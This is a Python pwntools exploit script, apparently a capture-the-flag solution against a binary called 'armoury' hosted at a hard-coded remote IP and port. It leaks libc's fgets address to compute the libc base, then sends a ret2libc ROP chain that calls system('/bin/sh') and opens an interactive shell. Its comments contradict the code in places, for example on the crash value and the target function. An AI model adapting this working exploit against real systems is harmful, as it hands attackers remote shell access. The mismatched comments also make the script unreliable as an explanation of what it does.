from pwn import *
import re

# Set up logging
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h']  # Split tmux window horizontally

# Change these as needed
BINARY = "../armoury"  # Path to binary
HOST = "107.191.48.172"  # Remote host if applicable
PORT = 7004  # Remote port if applicable
LOCAL = False # Set to False to connect to remote server

# Load the binary to get the address of system_override_protocol
elf = ELF(BINARY)
library = './libc.so.6'
libc = context.binary = ELF(library, checksec=False)

# Find the offset from the crash value 0x6161616c6161616b
# This is "kaaalaa" in ASCII (little-endian)
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
offset = cyclic_find(0x6161617461616173, endian='little')
info(f"Offset: {offset}")
info(f"pop rdi gadget: {hex(pop_rdi)}")
info(f"ret gadget: {hex(ret)}")

# Establish connection
if LOCAL:
    p = process(BINARY)
    # Use GDB for debugging
    #p = gdb.debug(BINARY, '''
    #break run_game
    #run
    #''')
else:
    p = remote(HOST, PORT)

# Receive and parse debug output
debug_output = p.recvuntil(b"==============================\n").decode()
info(f"Received debug output")

# Extract fgets address using regex
fgets_match = re.search(r"libc function \(fgets\) address: (0x[0-9a-f]+)", debug_output)
if fgets_match:
    fgets_addr = int(fgets_match.group(1), 16)
    info(f"Found fgets address: {hex(fgets_addr)}")
    
    # Load libc if we have it
    try:
        # Calculate libc base by subtracting fgets offset
        libc.address = fgets_addr - libc.sym['fgets']
        info(f"Calculated libc base: {hex(libc.address)}")
    except:
        info("Could not load libc, continuing without libc base calculation")
        libc = None
else:
    error("Could not find fgets address in debug output")
    libc = None

# Craft exploit payload: padding + address of system_override_protocol
overflow = b"A" * offset
binsh = next(libc.search(b'/bin/sh\x00'))
payload = flat([
    asm('nop') * offset,
    ret,
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    libc.sym['system']
])

# Send the exploit
p.sendline(payload)
info(f"Sent payload of size: {len(payload)}")

# Interact with the shell or program
p.interactive()
